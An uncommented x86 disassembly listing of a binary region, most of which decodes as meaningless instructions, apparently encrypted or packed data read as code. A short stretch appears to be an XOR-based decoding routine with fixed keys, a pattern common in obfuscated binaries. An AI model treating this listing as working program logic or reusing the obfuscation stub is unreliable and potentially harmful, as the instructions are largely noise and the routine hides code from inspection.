  4074c4:	adc    bl,BYTE PTR [eax]
  4074c6:	in     al,dx
  4074c7:	cmc    
  4074c8:	cmp    ah,BYTE PTR [esi+0x5b6ef006]
  4074ce:	mov    al,ds:0x9910612a
  4074d3:	mov    ds,eax
  4074d5:	jne    0x407518
  4074d7:	das    
  4074d8:	xchg   edi,eax
  4074d9:	repnz repz adc eax,DWORD PTR [esi+0x55]
  4074de:	add    BYTE PTR [ecx+0x56876699],ah
  4074e4:	or     al,0xd3
  4074e6:	xor    bh,BYTE PTR [edi+edx*8-0x46047b86]
  4074ed:	dec    eax
  4074ee:	dec    eax
  4074ef:	rcl    DWORD PTR ds:0x77c8929d,1
  4074f5:	adc    bl,ah
  4074f7:	and    eax,edx
  4074f9:	cmp    edx,0x4f
  4074fc:	stos   DWORD PTR es:[edi],eax
  4074fd:	add    BYTE PTR [eax-0x56],ch
  407500:	outs   dx,BYTE PTR ds:[esi]
  407501:	aaa    
  407502:	cdq    
  407503:	mov    edx,DWORD PTR [eax*2+0x5b875771]
  40750a:	mov    eax,ds:0x79d7cbf
  40750f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407511:	test   DWORD PTR [edi+ecx*4],edi
  407514:	fisub  WORD PTR [edi+0x1a]
  407517:	cmp    edx,DWORD PTR [esi+0x4e66e4cb]
  40751d:	adc    al,0x4b
  40751f:	jmp    0x4074d8
  407521:	adc    esi,DWORD PTR [ecx]
  407523:	add    cl,BYTE PTR [esi]
  407525:	loop   0x4074d8
  407527:	(bad)  
  407528:	fiadd  WORD PTR [edx+0x8]
  40752b:	pop    edx
  40752c:	imul   eax,edx,0x8d48f82
  407532:	add    BYTE PTR [ebp+0x35e8140b],bl
  407538:	call   0xb94a70c1
  40753d:	cdq    
  40753e:	enter  0x88c3,0xd6
  407542:	xchg   ecx,eax
  407543:	cld    
  407544:	mov    BYTE PTR [eax+ebx*8],bl
  407547:	mov    cl,0xb
  407549:	outs   dx,DWORD PTR ds:[esi]
  40754a:	cmp    dh,ch
  40754c:	adc    ebp,DWORD PTR [ebx+0x4a]
  40754f:	sub    eax,DWORD PTR [edi+0x41]
  407552:	aaa    
  407553:	push   ds
  407554:	sbb    DWORD PTR [edx+0x7b],ebx
  407557:	or     DWORD PTR [ebp+edx*1-0x7eb09d05],0xd1f61688
  407562:	ret    0x46f6
  407565:	push   ecx
  407566:	mov    ch,bh
  407568:	add    eax,0xec1c40ac
  40756d:	sub    esi,DWORD PTR [esi+0x33]
  407570:	add    eax,0xc1568446
  407575:	test   DWORD PTR [edx+0x6b3923e5],esp
  40757b:	fist   WORD PTR [ebx*1+0x3e29d1f9]
  407582:	mov    esi,DWORD PTR [ebx-0x59ae39e8]
  407588:	out    dx,al
  407589:	pop    ebx
  40758a:	(bad)  
  40758b:	cld    
  40758c:	fwait
  40758d:	xchg   DWORD PTR [ebp+0x4d8b34d1],ebx
  407593:	mov    ah,0xf
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x4e
  407613:	(bad)  [ecx+0x70]
  407616:	pop    ss
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi-0x58e7e7ee],bl
  40761f:	push   esi
  407620:	sub    eax,0xb74c682e
  407625:	jp     0x40767f
  407627:	sahf   
  407628:	xor    al,0xab
  40762a:	push   esi
  40762b:	xor    DWORD PTR [ebx-0x2cb0da0e],ebx
  407631:	in     eax,0x89
  407633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407634:	es jne 0x4076a4
  407637:	sub    eax,ebx
  407639:	out    0x2a,al
  40763b:	cmp    BYTE PTR [ecx-0x2f2d58e9],ah
  407641:	mov    dh,0xb8
  407643:	mov    ds:0x95bc0278,al
  407648:	dec    ebx
  407649:	mov    eax,ds:0xb426d001
  40764e:	call   0xa8cb:0xf550672c
  407655:	lods   eax,DWORD PTR ds:[esi]
  407656:	xchg   BYTE PTR [esi-0x2f4c4b67],al
  40765c:	mov    dh,BYTE PTR [ebp+edi*1+0x282fc994]
  407663:	fistp  QWORD PTR [ebx]
  407665:	retf   
  407666:	bound  eax,QWORD PTR [ebx-0x384e328d]
  40766c:	loopne 0x4076b3
  40766e:	lahf   
  40766f:	enter  0x5355,0x8d
  407673:	in     al,0xcf
  407675:	lock mov al,0x29
  407678:	pop    ebx
  407679:	add    DWORD PTR [edx],edi
  40767b:	loopne 0x407687
  40767d:	xlat   BYTE PTR ds:[ebx]
  40767e:	pop    ds
  40767f:	test   al,0x49
  407681:	add    DWORD PTR [ecx+0x173de046],0x7cbfc8b5
  40768b:	push   ds
  40768c:	cmp    BYTE PTR [ebx+0x6cc0d89d],bh
  407692:	inc    ecx
  407693:	rcl    DWORD PTR [ebx+0x51516284],1
  407699:	stos   BYTE PTR es:[edi],al
  40769a:	fild   QWORD PTR [ebx-0x230f42b5]
  4076a0:	adc    ecx,DWORD PTR [edx+0x40638ae5]
  4076a6:	cli    
  4076a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a9:	pop    ds
  4076aa:	cld    
  4076ab:	loopne 0x40764d
  4076ad:	jns    0x4076f3
  4076af:	mov    ch,0x15
  4076b1:	mov    dh,BYTE PTR [ebp+esi*1-0x60]
  4076b5:	sbb    ah,BYTE PTR [edx+esi*2]
  4076b8:	mov    cs,WORD PTR [edx]
  4076ba:	adc    al,0x1a
  4076bc:	imul   edx,DWORD PTR [edi],0x42fd2c66
  4076c2:	inc    ebp
  4076c3:	sub    al,0x81
  4076c5:	mov    ebx,0x8e80f05f
  4076ca:	pop    es
  4076cb:	xchg   DWORD PTR [esi-0x457276a6],edi
  4076d1:	inc    ebx
  4076d2:	fwait
  4076d3:	popf   
  4076d4:	leave  
  4076d5:	push   ss
  4076d6:	mov    ds,WORD PTR [edx-0x76]
  4076d9:	or     eax,0x4e1c880a
  4076de:	mov    eax,ds:0x4594d2d7
  4076e3:	aam    0xa1
  4076e5:	jl     0x407718
  4076e7:	xchg   ebx,eax
  4076e8:	mov    cl,0x2a
  4076ea:	push   es
  4076eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ed:	fiadd  WORD PTR [ebx+0x4e]
  4076f0:	mov    cl,BYTE PTR [ebp+0x46]
  4076f3:	sbb    eax,0xd59e99e1
  4076f8:	jae    0x4076eb
  4076fa:	sub    edx,DWORD PTR [ecx+0x26]
  4076fd:	test   BYTE PTR [ebx+eax*4-0x5d6c6c3c],cl
  407704:	sbb    al,0x97
  407706:	lea    esp,[esi]
  407708:	sub    al,0x2
  40770a:	rcr    BYTE PTR [edi+ebp*4],1
  40770d:	dec    esp
  40770e:	icebp  
  40770f:	xor    dl,BYTE PTR [edi-0x200fa5e0]
  407715:	sub    BYTE PTR [ecx],dl
  407717:	xor    esp,DWORD PTR [edx]
  407719:	out    0xb5,al
  40771b:	or     esp,DWORD PTR [ebx]
  40771d:	adc    ebx,DWORD PTR [esi-0x518ab2d7]
  407723:	aas    
  407724:	xchg   dh,cl
  407726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407727:	cmp    eax,0xa4bec56c
  40772c:	add    DWORD PTR [eax-0x2b17b577],ecx
  407732:	dec    ecx
  407733:	push   edi
  407734:	cs push 0xda100d14
  40773a:	mov    cl,0xbe
  40773c:	push   esi
  40773d:	mov    DWORD PTR [edi+0x1e],esp
  407740:	sub    ebp,eax
  407742:	pushf  
  407743:	jp     0x4076f6
  407745:	dec    edi
  407746:	cld    
  407747:	aam    0x92
  407749:	mov    cl,0x23
  40774b:	in     al,0x8c
  40774d:	xchg   edi,eax
  40774e:	in     al,dx
  40774f:	mov    BYTE PTR [ecx-0xc1aa90a],dh
  407755:	mov    bh,0x9e
  407757:	xchg   esi,eax
  407758:	xor    BYTE PTR [eax+0x29f0e901],bh
  40775e:	pop    ss
  40775f:	rcl    BYTE PTR [edx-0x5f],cl
  407762:	lea    edx,es:[ebp+0x37]
  407766:	lea    eax,[esi]
  407768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407769:	outs   dx,BYTE PTR ds:[esi]
  40776a:	loop   0x40777d
  40776c:	outs   dx,DWORD PTR ds:[esi]
  40776d:	fadd   st(2),st
  40776f:	fs sti 
  407771:	(bad)  
  407772:	aas    
  407773:	bound  esp,QWORD PTR [edx+edi*2]
  407776:	jmp    0x7c45:0xd5ce29a5
  40777d:	sti    
  40777e:	adc    al,0xa1
  407780:	dec    ebp
  407781:	push   0xffffffb1
  407783:	mov    ds:0xd6af64f8,eax
  407788:	pop    es
  407789:	shl    DWORD PTR [esp+ebp*1],cl
  40778c:	gs and al,0x73
  40778f:	xchg   DWORD PTR [edi-0x34eadd91],ecx
  407795:	sbb    eax,0x5bf67c2
  40779a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779b:	xchg   edx,eax
  40779c:	pop    edi
  40779d:	and    dh,BYTE PTR [edx+edx*4+0x5c]
  4077a1:	pop    ss
  4077a2:	aaa    
  4077a3:	in     eax,dx
  4077a4:	push   0xc146b22
  4077a9:	pop    edi
  4077aa:	shl    DWORD PTR [eax],cl
  4077ac:	retf   
  4077ad:	cmp    eax,0x49f665c3
  4077b2:	call   0x194b:0x28818b54
  4077b9:	iret   
  4077ba:	jns    0x4077d6
  4077bc:	(bad)  
  4077bd:	cdq    
  4077be:	fs popf 
  4077c0:	inc    esp
  4077c1:	adc    eax,0x42850184
  4077c6:	and    dh,0x50
  4077c9:	add    edx,ebp
  4077cb:	dec    edi
  4077cc:	fld    TBYTE PTR [esi-0x2f55ee1f]
  4077d2:	leave  
  4077d3:	imul   esi,DWORD PTR [ebp-0x27],0x920edaaf
  4077da:	into   
  4077db:	xchg   DWORD PTR [ecx-0x7b],ecx
  4077de:	test   eax,0x8f14a0a2
  4077e3:	sbb    eax,0x55f791bc
  4077e8:	push   ecx
  4077e9:	and    eax,0xeff7b396
  4077ee:	loopne 0x4077ac
  4077f0:	and    al,0xea
  4077f3:	push   ds
  4077f4:	and    ch,BYTE PTR [esi+0x6e494a86]
  4077fa:	outs   dx,BYTE PTR ds:[esi]
  4077fb:	push   ebp
  4077fd:	out    dx,al
  4077fe:	pop    esi
  4077ff:	mov    cl,0xbb
  407801:	jnp    0x407844
  407803:	lods   al,BYTE PTR ds:[esi]
  407804:	mov    BYTE PTR ss:[edi+ebp*1-0x325dbc64],0xd2
  40780d:	fnstenv [ebp+esi*8-0x414884be]
  407814:	jnp    0x407834
  407816:	mov    al,0x6b
  407818:	cmp    DWORD PTR [esi+0x18],eax
  40781b:	add    BYTE PTR [edi+esi*1],0x7c
  40781f:	jp     0x4077ca
  407821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407822:	jbe    0x407826
  407824:	wrmsr  
  407826:	ins    BYTE PTR es:[edi],dx
  407827:	imul   ecx,DWORD PTR [ecx-0x46],0xfffffff1
  40782b:	sub    BYTE PTR [ebp+edi*2-0x4b9fd040],bl
  407832:	sub    DWORD PTR fs:[edi],0xffffffae
  407836:	push   edx
  407837:	js     0x4077bd
  407839:	int    0x74
  40783b:	cmp    ecx,edx
  40783d:	js     0x407864
  40783f:	mov    edi,edi
  407841:	les    ebx,FWORD PTR [ecx]
  407843:	pop    esi
  407844:	in     al,dx
  407845:	xor    edi,0x15
  407848:	aaa    
  407849:	push   0xdbdb44ba
  40784e:	mov    al,0xff
  407850:	iret   
  407851:	mov    DWORD PTR [edi],eax
  407853:	nop
  407854:	pop    ss
  407855:	inc    edi
  407856:	jmp    0x24fe24fe
  40785b:	sub    BYTE PTR [ebx],bl
  40785d:	push   esi
  40785e:	int3   
  40785f:	xlat   BYTE PTR ds:[ebx]
  407860:	push   edx
  407861:	dec    esi
  407862:	in     al,dx
  407863:	adc    BYTE PTR [eax],al
  407865:	and    ecx,DWORD PTR [esi-0x1d35f02c]
  40786b:	pop    ecx
  40786c:	jmp    FWORD PTR [ecx-0x3a6b1405]
  407872:	mov    esi,0x91a9d04e
  407877:	push   ecx
  407878:	jae    0x4078e9
  40787a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40787b:	jmp    0x407860
  40787d:	push   ds
  40787e:	in     eax,0x7b
  407880:	iret   
  407881:	bound  esp,QWORD PTR [ecx]
  407883:	cmp    esp,eax
  407885:	or     eax,ebp
  407887:	loope  0x4078ad
  407889:	or     al,0x56
  40788b:	ds in  eax,0x65
  40788e:	gs pop eax
  407890:	loop   0x4078ec
  407892:	jnp    0x407861
  407894:	int    0x8c
  407896:	sar    dl,1
  407898:	jmp    0x359:0x9332b743
  40789f:	mov    esp,0xb4dea32a
  4078a4:	rcl    ebx,0x7e
  4078a7:	xor    eax,0xcf74b0fe
  4078ac:	les    eax,FWORD PTR [ecx+0x32]
  4078af:	pop    ds
  4078b0:	push   ss
  4078b1:	cmp    DWORD PTR [esi+0x37],0x4e9250b6
  4078b8:	mov    cl,0x31
  4078ba:	std    
  4078bb:	pop    ebp
  4078bc:	arpl   WORD PTR [esp+ebp*2],dx
  4078bf:	rcr    esp,cl
  4078c1:	loope  0x407884
  4078c3:	retf   0x8af6
  4078c6:	adc    ebx,DWORD PTR [ebx+0x44bce18]
  4078cc:	lods   eax,DWORD PTR ds:[esi]
  4078cd:	and    eax,0xef069a92
  4078d2:	jge    0x407924
  4078d4:	jg     0x407860
  4078d6:	dec    eax
  4078d7:	sbb    al,0xc
  4078d9:	dec    ebp
  4078da:	mov    ch,0x14
  4078dc:	daa    
  4078dd:	mov    bl,0xfe
  4078df:	adc    al,0x30
  4078e1:	jne    0x4078f1
  4078e3:	jg     0x407902
  4078e5:	cs xchg edi,eax
  4078e7:	or     bl,BYTE PTR [eax]
  4078e9:	icebp  
  4078ea:	sbb    edi,DWORD PTR [edi+esi*8+0x5a]
  4078ee:	outs   dx,BYTE PTR ds:[esi]
  4078ef:	and    DWORD PTR [ebx-0x68af4bd9],esp
  4078f5:	pop    es
  4078f6:	dec    esp
  4078f7:	push   eax
  4078f8:	add    eax,eax
  4078fa:	pushf  
  4078fb:	sub    BYTE PTR [ecx+edi*8],al
  4078fe:	adc    eax,0x10303ed7
  407903:	inc    edx
  407904:	or     al,0xfd
  407906:	and    dl,0xd4
  407909:	and    DWORD PTR [edi+0x7f],ebx
  40790c:	add    bl,BYTE PTR [edx-0x67]
  40790f:	sub    bh,bl
  407911:	xchg   ebx,eax
  407912:	stos   DWORD PTR es:[edi],eax
  407913:	mov    dl,0xf3
  407915:	out    0x55,eax
  407917:	mov    fs,WORD PTR [edi]
  407919:	test   BYTE PTR ds:0x83c33de8,bl
  40791f:	dec    edi
  407920:	ficom  WORD PTR [edi]
  407922:	(bad)  
  407923:	shl    DWORD PTR [eax],1
  407925:	sub    DWORD PTR [edx-0xe],eax
  407928:	pushf  
  407929:	xchg   edx,eax
  40792a:	iret   
  40792b:	cwde   
  40792c:	xchg   ecx,eax
  40792d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792e:	dec    ecx
  40792f:	into   
  407930:	xor    DWORD PTR [eax-0x5],ebx
  407933:	daa    
  407934:	not    dl
  407936:	mov    esp,0xa334af48
  40793b:	std    
  40793c:	dec    ecx
  40793d:	mov    dl,0x50
  40793f:	dec    esp
  407940:	mov    dl,0x8d
  407942:	xchg   ebp,eax
  407943:	mov    edi,0xfb434a1f
  407948:	jg     0x4078e0
  40794a:	xchg   esp,eax
  40794b:	cmp    ebp,DWORD PTR [esi-0x70]
  40794e:	jb     0x4078d3
  407950:	sar    DWORD PTR [eax],1
  407952:	mov    cl,bh
  407954:	jae    0x40799c
  407956:	xor    eax,DWORD PTR [edx-0x6055d848]
  40795c:	inc    edi
  40795d:	mov    edx,0xb342061e
  407962:	cmp    eax,DWORD PTR [ebx]
  407964:	pop    esi
  407965:	mov    eax,0x66eb7d9
  40796a:	pop    es
  40796b:	fild   WORD PTR gs:[edi+0x39dd49b2]
  407972:	pusha  
  407973:	jo     0x4078f9
  407975:	cmp    ebx,DWORD PTR [ebp+0x2d57ee0e]
  40797b:	retf   0x814
  40797e:	or     edx,ebp
  407980:	mov    edx,eax
  407982:	js     0x40790c
  407984:	push   ebp
  407985:	xlat   BYTE PTR ds:[ebx]
  407986:	dec    ebx
  407987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407988:	xor    al,0x19
  40798a:	hlt    
  40798b:	ins    DWORD PTR es:[edi],dx
  40798c:	lahf   
  40798d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40798e:	mov    esp,DWORD PTR [ecx-0x77]
  407991:	and    DWORD PTR [ecx],eax
  407993:	mov    edx,ds
  407995:	mov    DWORD PTR [edi],ecx
  407997:	in     al,0x29
  407999:	mov    ebx,0xd9a67b82
  40799e:	or     DWORD PTR [edx+0x47],0x31
  4079a2:	(bad)  
  4079a3:	in     al,dx
  4079a4:	stos   BYTE PTR es:[edi],al
  4079a5:	pmullw mm4,QWORD PTR [edx+0x63]
  4079a9:	add    dl,bl
  4079ab:	pop    es
  4079ac:	and    eax,0x7b335dc3
  4079b1:	add    al,0xf7
  4079b3:	dec    esp
  4079b4:	add    al,0x6a
  4079b6:	xor    DWORD PTR [esi-0x116d7f43],ecx
  4079bc:	sbb    dh,bl
  4079be:	push   edx
  4079bf:	stos   BYTE PTR es:[edi],al
  4079c0:	sahf   
  4079c1:	stos   BYTE PTR es:[edi],al
  4079c2:	cld    
  4079c3:	and    ebx,DWORD PTR [esi-0x11]
  4079c6:	loop   0x4079a2
  4079c8:	bound  edi,QWORD PTR [edi+ebx*8]
  4079cb:	adc    al,0xa2
  4079cd:	mov    ch,0x58
  4079cf:	inc    esp
  4079d0:	out    dx,eax
  4079d1:	imul   esp,esi,0xaeb612d
  4079d7:	and    al,0x47
  4079d9:	fwait
  4079da:	outs   dx,DWORD PTR ds:[esi]
  4079db:	jle    0x4079db
  4079dd:	icebp  
  4079de:	xrelease mov DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407980
  4079f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f6:	mov    esp,0x1818759d
  4079fb:	sahf   
  4079fc:	adc    bl,BYTE PTR [eax]
  4079fe:	sbb    BYTE PTR [eax+0x30e156c7],dh
  407a04:	sub    al,0x33
  407a06:	gs inc esp
  407a08:	js     0x4079a1
  407a0a:	inc    esp
  407a0b:	jb     0x4079ce
  407a0d:	rol    eax,cl
  407a0f:	jns    0x407a09
  407a11:	sahf   
  407a12:	jmp    0x4079f9
  407a14:	jle    0x4079b8
  407a16:	loope  0x4079c8
  407a18:	test   al,0x74
  407a1a:	sub    al,0x47
  407a1c:	sbb    esp,esp
  407a1e:	xchg   DWORD PTR [esi+0x54698a1e],edi
  407a24:	or     esp,DWORD PTR [ebp+ebx*8-0x495d04e3]
  407a2b:	or     eax,0x122cb37d
  407a30:	sub    eax,0x76e9cb6
  407a35:	ds xor eax,0x5360f1ca
  407a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a3c:	add    edx,0xffffffea
  407a3f:	fdivr  QWORD PTR ds:0x556c5e28
  407a45:	push   esi
  407a46:	xchg   esi,eax
  407a47:	call   0xfc59:0xe1536aec
  407a4e:	ja     0x407a35
  407a50:	lea    ebx,[ebx+0x1fa5eb78]
  407a56:	cmp    ebx,esp
  407a58:	mov    eax,ds:0x7abe1bc
  407a5d:	cmp    al,BYTE PTR [esi+0x28]
  407a60:	test   DWORD PTR [ebx+0x4a],ecx
  407a63:	mov    esp,0xa2a85749
  407a68:	rcl    ecx,0x4e
  407a6b:	loop   0x407a92
  407a6d:	scas   al,BYTE PTR es:[edi]
  407a6e:	fcom   DWORD PTR [edi+0xa2eebbb]
  407a74:	shl    BYTE PTR [edi+0x4e18b1d4],0xed
  407a7b:	cwde   
  407a7c:	call   0xb9f:0xcb91ba1e
  407a83:	dec    edx
  407a84:	jnp    0x407abd
  407a86:	xchg   edi,eax
  407a87:	fild   WORD PTR [ebp+ebp*2+0x71]
  407a8b:	imul   DWORD PTR [edi]
  407a8d:	push   0xacd5f848
  407a92:	and    ecx,DWORD PTR [esp+ebp*1-0x64]
  407a96:	and    esp,DWORD PTR [edi]
  407a98:	jbe    0x407a8e
  407a9a:	jae    0x407a97
  407a9c:	lds    ecx,FWORD PTR [ecx+eax*1]
  407a9f:	push   ebp
  407aa0:	je     0x407a42
  407aa2:	inc    ebp
  407aa3:	imul   ebp,DWORD PTR [ebp+0x2e],0xc828d4dd
  407aaa:	imul   ebp,DWORD PTR [edx],0x3b
  407aad:	adc    DWORD PTR [edx-0x13d79f13],ebp
  407ab3:	sbb    eax,0xa3282cd
  407ab8:	xchg   ecx,eax
  407ab9:	fdivr  DWORD PTR [ecx+edx*4+0x72]
  407abd:	mov    edi,0xf2194877
  407ac2:	scas   eax,DWORD PTR es:[edi]
  407ac3:	jmp    0x407a69
  407ac5:	inc    edi
  407ac6:	and    BYTE PTR [edi-0x29],ah
  407ac9:	sahf   
  407aca:	add    al,0x73
  407acc:	iret   
  407acd:	cmp    eax,0xa09c326f
  407ad2:	int3   
  407ad3:	in     al,0xf0
  407ad5:	xor    ah,cl
  407ad7:	in     eax,dx
  407ad8:	loope  0x407ae0
  407ada:	scas   eax,DWORD PTR es:[edi]
  407adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407adc:	data16 sbb BYTE PTR [ebx+edx*2],dh
  407ae0:	icebp  
  407ae1:	jnp    0x407a9b
  407ae3:	sar    cl,1
  407ae5:	xchg   ecx,eax
  407ae6:	cmp    eax,0x428926d5
  407aeb:	mov    esp,0xf58abe2a
  407af0:	push   ebx
  407af1:	inc    esi
  407af2:	sbb    al,0x22
  407af4:	jns    0x407b14
  407af6:	mov    edx,0x501f0ee8
  407afb:	jmp    0x329e91f1
  407b00:	(bad)  
  407b01:	push   cs
  407b02:	sbb    ah,BYTE PTR [edi+0x36]
  407b05:	push   edx
  407b06:	jb     0x407b09
  407b08:	xor    al,0x99
  407b0a:	in     al,0x8e
  407b0c:	iret   
  407b0d:	adc    eax,0x39b986cd
  407b12:	mov    eax,0x9a36e33e
  407b17:	and    cl,dl
  407b19:	loope  0x407ace
  407b1b:	into   
  407b1c:	or     dl,BYTE PTR [edi-0x6a0df622]
  407b22:	ret    0xcae7
  407b25:	cmp    al,0x4
  407b27:	mov    bl,0x2d
  407b29:	das    
  407b2a:	sub    al,0xf2
  407b2c:	or     eax,0xa71c88da
  407b31:	repz sub al,BYTE PTR [esi+0x7d]
  407b35:	daa    
  407b36:	in     al,dx
  407b37:	inc    esp
  407b38:	adc    al,0x5d
  407b3a:	adc    al,0x43
  407b3c:	inc    esi
  407b3d:	sbb    ah,cl
  407b3f:	dec    esi
  407b40:	push   esp
  407b41:	rol    BYTE PTR [ecx+0x2a],cl
  407b44:	mov    ebp,0x695cf9c2
  407b49:	clc    
  407b4a:	repnz pop ss
  407b4c:	push   0x605f1567
  407b51:	cmc    
  407b52:	pop    esi
  407b53:	or     BYTE PTR [edx],dh
  407b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b56:	inc    ecx
  407b57:	or     ah,BYTE PTR [eax+0x216b39c9]
  407b5d:	mov    bl,0x26
  407b5f:	ins    BYTE PTR es:[edi],dx
  407b60:	push   esp
  407b61:	jmp    0xe6b7c91c
  407b66:	or     cl,BYTE PTR [esi-0x2d]
  407b69:	and    edi,DWORD PTR [ebx+0x41c782e0]
  407b6f:	jo     0x407b39
  407b71:	jne    0x407b8a
  407b73:	test   DWORD PTR [ecx],eax
  407b75:	pop    esi
  407b76:	jp     0x407b25
  407b78:	cld    
  407b79:	inc    ebx
  407b7a:	inc    esi
  407b7b:	pop    es
  407b7c:	push   0x11c97818
  407b81:	inc    ecx
  407b82:	out    0x98,al
  407b84:	pop    ds
  407b85:	cmp    cl,al
  407b87:	in     al,dx
  407b88:	or     al,0x91
  407b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b8b:	into   
  407b8c:	pop    eax
  407b8d:	inc    eax
  407b8e:	aas    
  407b8f:	and    dl,ch
  407b91:	aaa    
  407b92:	sub    DWORD PTR [eax+0xf],edi
  407b95:	cs and al,0x32
  407b98:	add    ecx,DWORD PTR [edi-0x44]
  407b9b:	mov    al,ds:0xe8096fa1
  407ba0:	mov    BYTE PTR [ebp+eiz*4-0x6e],dh
  407ba4:	repnz retf 
  407ba6:	imul   esp,DWORD PTR [ebx],0x57a33b1a
  407bac:	mov    eax,DWORD PTR ds:0x2fd574a3
  407bb2:	sub    al,0xdd
  407bb4:	cmp    DWORD PTR [esi],eax
  407bb6:	and    ebx,DWORD PTR [ebp+0x4a656ce]
  407bbc:	fisub  WORD PTR [ebx+0x44]
  407bbf:	ret    
  407bc0:	iret   
  407bc1:	addr16 dec edx
  407bc3:	jbe    0x407beb
  407bc5:	push   ss
  407bc6:	enter  0x535d,0x40
  407bca:	into   
  407bcb:	mov    bh,BYTE PTR [edi+0x1f]
  407bce:	push   cs
  407bcf:	je     0x407c2d
  407bd1:	shl    DWORD PTR [eax],cl
  407bd3:	sar    ebx,cl
  407bd5:	sahf   
  407bd6:	pop    esi
  407bd7:	or     DWORD PTR ds:0x3da545a8,0x1c
  407bde:	sar    ebx,cl
  407be0:	mov    cl,0xb1
  407be2:	fwait
  407be3:	(bad)  
  407be4:	repz push 0x22e9f688
  407bea:	pop    ebp
  407beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bec:	stos   DWORD PTR es:[edi],eax
  407bed:	jge    0x407bd2
  407bef:	sbb    eax,0x4b91702c
  407bf4:	stos   BYTE PTR es:[edi],al
  407bf5:	loop   0x407c76
  407bf7:	adc    esp,esi
  407bf9:	mov    esi,0x6f547e42
  407bfe:	push   esi
  407bff:	cld    
  407c00:	mov    ebp,edi
  407c02:	(bad)  [edi-0x3e]
  407c05:	jl     0x407c4b
  407c07:	out    dx,eax
  407c08:	lahf   
  407c09:	mov    ecx,0xa0f937ed
  407c0e:	aad    0xd1
  407c10:	cmp    ebp,esp
  407c12:	stos   BYTE PTR es:[edi],al
  407c13:	bound  eax,QWORD PTR [ebp-0x2c8f328c]
  407c19:	aaa    
  407c1a:	adc    al,cl
  407c1c:	jg     0x407c04
  407c1e:	add    eax,0x997bf97c
  407c23:	cwde   
  407c24:	push   edx
  407c25:	inc    eax
  407c26:	loop   0x407bfc
  407c28:	xchg   edx,eax
  407c29:	rcr    DWORD PTR es:[eax-0x59],cl
  407c2d:	les    edx,FWORD PTR [esi]
  407c2f:	xor    DWORD PTR ds:0x6c973f1e,0x21
  407c36:	leave  
  407c37:	sub    edi,DWORD PTR [ebx]
  407c39:	sbb    al,0xae
  407c3b:	sub    eax,0xae9aeb2c
  407c40:	jge    0x407c38
  407c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c43:	jb     0x407bca
  407c45:	daa    
  407c46:	jb     0x407c15
  407c48:	in     al,0x95
  407c4a:	adc    ecx,DWORD PTR [ecx]
  407c4c:	add    DWORD PTR [edx-0x27acaab6],ebx
  407c52:	dec    edi
  407c53:	pop    ss
  407c54:	push   edi
  407c55:	xchg   esi,eax
  407c56:	arpl   WORD PTR [edx-0x7fc3a20f],bp
  407c5c:	jne    0x407c93
  407c5e:	jg     0x407cc5
  407c60:	mov    ah,0xf
  407c62:	dec    ebp
  407c63:	jno    0x407c81
  407c65:	retf   
  407c66:	cmp    dl,BYTE PTR [ebx+0x6a]
  407c69:	cmp    DWORD PTR [eax-0x6509e6fb],eax
  407c6f:	loope  0x407c1d
  407c71:	in     al,0x52
  407c73:	jae    0x407ca2
  407c75:	sub    BYTE PTR [edx+edx*4-0x3],0x48
  407c7a:	sbb    dl,BYTE PTR [edi+0x5]
  407c7d:	lods   eax,DWORD PTR ds:[esi]
